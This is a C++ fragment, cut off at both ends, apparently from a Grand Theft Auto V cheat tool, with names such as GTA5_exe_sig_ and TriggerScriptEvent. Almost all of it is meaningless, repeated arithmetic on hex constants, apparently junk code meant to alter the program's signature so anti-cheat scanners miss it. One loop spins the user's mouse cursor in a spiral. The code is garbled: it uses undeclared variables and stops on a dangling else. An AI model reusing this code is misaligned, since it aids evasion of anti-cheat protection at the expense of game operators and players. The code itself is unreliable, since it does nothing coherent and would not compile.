				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			int count = 800;
			int movex, movey;
			float angle = 0.0f;
			SetCursorPos(GetSystemMetrics(SM_CXSCREEN) / 2, GetSystemMetrics(SM_CYSCREEN) / 2);
			for (int i = 0; i <= count; i++) {
				angle = .3 * i;
				movex = (angle * cos(angle) * 2) + GetSystemMetrics(SM_CXSCREEN) / static_cast<float>(2);
				movey = (angle * sin(angle) * 2) + GetSystemMetrics(SM_CYSCREEN) / 2;
				SetCursorPos(movex, movey);
				Sleep(1);
			}
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
